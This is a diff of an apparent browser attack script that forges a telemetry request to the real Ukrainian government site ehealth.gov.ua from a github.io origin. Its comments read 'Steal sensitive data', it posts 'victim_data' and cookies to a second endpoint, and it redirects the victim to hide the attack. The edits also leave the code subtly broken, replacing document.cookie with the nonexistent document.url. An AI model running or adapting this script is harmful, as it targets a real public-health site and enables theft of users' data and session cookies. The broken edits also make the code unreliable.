@@ -11,7 +11,7 @@ fetch('https://ehealth.gov.ua/cdn-cgi/rum', {
     'Accept-Language': 'en-US,en;q=0.5',
     'Accept-Encoding': 'gzip, deflate, br',
     'Content-Type': 'application/json',
-    'Content-Length': '726',
+    'Content-Length': '274',
     'Origin': 'https://alchemysan.github.io',
     'Referer': 'https://alchemysan.github.io',
     'Sec-Fetch-Dest': 'empty',
@@ -26,37 +26,12 @@ fetch('https://ehealth.gov.ua/cdn-cgi/rum', {
     'referrer': 'https://ehealth.gov.ua/',
     'eventType': 1,
     'firstPaint': 0,
-    'firstContentfulPaint': 0,
     'startTime': 1783428730551,
-    'versions': {
-      'fl': '2024.11.0',
-      'js': '2026.6.0',
-      'timings': 2
-    },
-    'pageloadId': '2e8dce6a-4243-466e-baed-f72866a66248',
     'location': 'https://ehealth.gov.ua/statusy-testuvannya-ta-pidklyuchennya-dmis-do-ais-tsentral-103/',
-    'nt': 'reload',
-    'timingsV2': {
-      'nextHopProtocol': 'h2',
-      'domainLookupStart': 3,
-      'domainLookupEnd': 3,
-      'connectStart': 3,
-      'connectEnd': 3,
-      'requestStart': 37,
-      'responseStart': 69524,
-      'responseEnd': 69525,
-      'domInteractive': 73126,
-      'domComplete': 73161,
-      'loadEventStart': 73161,
-      'loadEventEnd': 73166,
-      'transferSize': 32841,
-      'decodedBodySize': 32541
-    },
     'siteToken': '51f6b6d6f76f454cab1fc5c1f66fd188',
     'st': 2
   })
 })
-.then(response => response.json())
 .then(data => {
   // Steal sensitive data
   console.log('Stolen data:', data);
@@ -69,13 +44,13 @@ fetch('https://ehealth.gov.ua/cdn-cgi/rum', {
     },
     body: JSON.stringify({
       victim_data: data,
-      cookies: document.cookie
+      cookies: document.url
     })
   });
   
   // Optional: redirect to hide attack
   setTimeout(() => {
-    window.location = 'https://target.com';
+    window.location = 'https://ft.com';
   }, 500);
 });
 </script>
